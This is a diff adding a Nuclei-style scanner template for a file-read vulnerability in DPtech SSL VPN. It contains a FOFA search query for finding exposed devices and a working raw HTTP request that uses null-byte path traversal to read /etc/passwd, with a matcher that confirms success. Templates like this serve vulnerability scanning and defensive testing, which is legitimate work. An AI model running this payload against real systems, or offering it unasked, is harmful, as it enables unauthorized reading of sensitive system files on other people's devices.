@@ -1,0 +1,22 @@
+
+id: Dp-VPN-readFile-2024-10-11
+
+info:
+  name: Dp-VPN-readFile
+  author: final
+  severity: high
+  description: DPtech SSL VPN 服务存在一个文件读取漏洞，攻击者可以通过利用此漏洞读取目标系统上的敏感文件。该漏洞可能导致未经授权的信息泄露，危及系统的机密性和完整性。
+  metadata: 
+    fofa-query: title=="SSL VPN Service" && header="Dptech" || cert="DPtechCa"
+
+http:
+  - raw:
+      - |     
+        GET /.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00.%2Fetc%2Fpasswd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==200 && contains_all(body,"root")'
